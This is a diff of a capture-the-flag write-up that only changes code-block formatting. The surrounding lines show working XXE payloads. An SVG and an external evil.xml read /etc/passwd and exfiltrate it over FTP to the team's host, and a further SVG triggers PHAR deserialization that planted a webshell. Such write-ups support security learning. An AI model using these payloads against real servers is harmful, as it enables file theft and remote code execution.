@@ -112,7 +112,7 @@ header('Location: index.php');
 ### XXE ###
 
 Using the following `SVG` file it was possible to confirm the `XXE`:
-```
+{% highlight xml %}
 <!DOCTYPE svg [
 <!ELEMENT svg ANY >
 <!ENTITY % sp SYSTEM "http://jbz.team/">
@@ -130,13 +130,13 @@ Using the following `SVG` file it was possible to confirm the `XXE`:
          </flowDiv>
       </flowRoot>
 </svg>
-```
+{% endhighlight %}
 
 At that point we were like "OK, it's time for a first blood!!11!!1"!
 We spawned an `FTP` and an `HTTP` services to retrieve data `OOB` and we weaponized the `SVG` file.
 
 **SVG**
-```
+{% highlight xml %}
 <!DOCTYPE svg [
 <!ELEMENT svg ANY >
 <!ENTITY % sp SYSTEM "http://jbz.team/evil.xml">
@@ -155,12 +155,12 @@ We spawned an `FTP` and an `HTTP` services to retrieve data `OOB` and we weaponi
          </flowDiv>
       </flowRoot>
 </svg>
-```
+{% endhighlight %}
 **evil.xml**
-```
+{% highlight xml %}
 <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://jbz.team/%data;'>">
-```
+{% endhighlight %}
 
 A `php://filter` was used in order to exfiltrate data in base64, which prevents problems with new lines, encoding, etc.
 
@@ -268,7 +268,7 @@ class Image {
 ### RCE ###
 
 We uploaded the generated polyglot `PHAR` to the server, and then triggered the deserialization via the following `SVG`:
-```
+{% highlight xml %}
 <!DOCTYPE svg [
 <!ELEMENT svg ANY >
 <!ENTITY % data SYSTEM "phar://images/<phpsessid>/<phar_file_name>.jpg">
@@ -286,7 +286,7 @@ We uploaded the generated polyglot `PHAR` to the server, and then triggered the 
          </flowDiv>
       </flowRoot>
 </svg>
-```
+{% endhighlight %}
 
 And boom we visited the downloaded webshell which executed our commands.
 
